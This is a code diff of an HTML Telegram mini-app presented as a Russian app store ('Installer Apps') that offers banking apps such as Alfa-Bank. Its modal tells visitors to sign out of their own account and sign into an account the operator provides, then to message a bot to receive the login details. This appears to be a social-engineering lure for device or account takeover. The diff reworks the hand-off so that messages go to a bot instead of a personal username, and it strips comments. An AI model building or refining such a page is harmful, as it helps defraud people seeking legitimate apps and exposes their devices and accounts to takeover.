@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>AppWay</title>
+<title>Installer Apps</title>
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
@@ -75,7 +75,6 @@
   .modal-header { text-align: center; font-size: 20px; font-weight: 700; margin-bottom: 16px; position: relative;}
   .close-modal { position: absolute; right: 0; top: 0; font-size: 24px; color: #999; cursor: pointer; padding: 5px;}
   
-  /* Второй шаг инструкции */
   #step2 { display: none; }
 </style>
 </head>
@@ -84,7 +83,7 @@
 <!-- ГЛАВНЫЙ ЭКРАН -->
 <div id="main-page">
   <div class="header">
-    <div class="logo-area"><div class="logo-icon">⚡</div><div class="logo-text">ProstoApp</div></div>
+    <div class="logo-area"><div class="logo-icon">⚡</div><div class="logo-text">Installer Apps</div></div>
   </div>
   <div class="search-bar">🔍 Какое приложение нужно?</div>
   <div class="banner banner-purple">
@@ -121,9 +120,8 @@
     <button class="btn-get">Получить</button>
   </div>
   
-  <!-- Альфа-Банк (с картинкой) -->
+  <!-- Альфа-Банк -->
   <div class="app-item" onclick="openApp('Альфа-Банк', 'Финансы · Альфа', '4.7', '225 тыс.', '#EF3124', 'А', 'img_alfa')">
-    <!-- ТУТ ВСТАВЛЕНА КАРТИНКА В ФОРМАТЕ BASE64 -->
     <img id="img_alfa" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAP//////////////////////////////////////////////////////////////////////////////////////2wBDAf//////////////////////////////////////////////////////////////////////////////////////wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAf/xAAUEAEAAAAAAAAAAAAAAAAAAAAA/8QAFQEBAQAAAAAAAAAAAAAAAAAAAAX/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCwAA8A/9k=" class="app-icon">
     <div class="app-info"><div class="app-name">Альфа-Банк</div><div class="app-desc">Финансы · Альфа</div><div class="app-rating">⭐ 4.7 · 225 тыс.</div></div>
     <button class="btn-get">Получить</button>
@@ -184,7 +182,7 @@
   </div>
 </div>
 
-<!-- СТРАНИЦА ПРИЛОЖЕНИЯ (открывается при клике) -->
+<!-- СТРАНИЦА ПРИЛОЖЕНИЯ -->
 <div id="app-page">
   <div class="top-bar">
     <div class="back-btn" onclick="goBackToList()">←</div>
@@ -212,17 +210,15 @@
     <div class="stat-item"><div class="stat-val">126 МБ</div><div class="stat-label">Размер</div></div>
   </div>
 
-  <!-- Заглушка для скриншотов -->
   <div class="screenshots">
     <div style="min-width: 150px; height: 250px; background: #0077FF; border-radius: 16px; display: flex; justify-content: center; align-items: center; color: white; font-weight: bold;">Скриншот 1</div>
     <div style="min-width: 150px; height: 250px; background: #7b61ff; border-radius: 16px; display: flex; justify-content: center; align-items: center; color: white; font-weight: bold;">Скриншот 2</div>
   </div>
 </div>
 
-<!-- МОДАЛЬНОЕ ОКНО С ИНСТРУКЦИЕЙ -->
+<!-- МОДАЛЬНОЕ ОКНО -->
 <div class="modal-overlay" id="modal">
   <div class="modal-content">
-    <!-- ШАГ 1 -->
     <div id="step1">
       <div class="modal-header">
         Шаг 1 · Выход из аккаунта
@@ -243,7 +239,6 @@
       </div>
     </div>
 
-    <!-- ШАГ 2 -->
     <div id="step2">
       <div class="modal-header">
         Шаг 2 · Вход в выданный аккаунт
@@ -260,7 +255,6 @@
         <button style="width: 100%; background: var(--blue); color: white; border: none; padding: 16px; border-radius: 14px; font-size: 16px; font-weight: 600;" onclick="goToTelegram()">⬇️ Получить данные</button>
       </div>
     </div>
-
   </div>
 </div>
 
@@ -269,9 +263,7 @@
   tg.expand();
   tg.ready();
 
-  // ТВОЙ НИК
-  const myTelegramUsername = "ТВОЙ_НИКНЕЙМ"; 
-
+  // ВАЖНО: Теперь мы не используем ник, а шлем данные боту!
   let currentAppName = "";
   let currentAppIconBg = "#000";
   let currentAppLetter = "A";
@@ -291,7 +283,6 @@
     document.getElementById('list-page').style.display = 'block';
   }
 
-  // Открытие страницы приложения
   function openApp(name, desc, rating, count, bgColor, letter, imgId) {
     currentAppName = name;
     currentAppIconBg = bgColor;
@@ -307,7 +298,6 @@
     document.getElementById('stat-rating').innerText = rating + " ★";
     document.getElementById('stat-count').innerText = count;
 
-    // Устанавливаем иконку (если это картинка, копируем src, иначе ставим букву)
     let iconDiv = document.getElementById('app-page-icon');
     if(imgId) {
       let img = document.getElementById(imgId);
@@ -332,9 +322,11 @@
     document.getElementById('modal').style.display = 'none';
   }
 
+  // НОВАЯ ФУНКЦИЯ: Отправляем данные боту
   function goToTelegram() {
-    const text = encodeURIComponent(`Здравствуйте, я по поводу установки приложения ${currentAppName}, я вышел(-ла) из своего аккаунта, ожидаю данные.`);
-    window.location.href = `https://t.me/${myTelegramUsername}="Installer_Apps"?text=${text}`;
+    const text = `Здравствуйте, я по поводу установки приложения ${currentAppName}, я вышел(-ла) из своего аккаунта, ожидаю данные.`;
+    tg.sendData(text);
+    tg.close();
   }
 </script>
 </body>
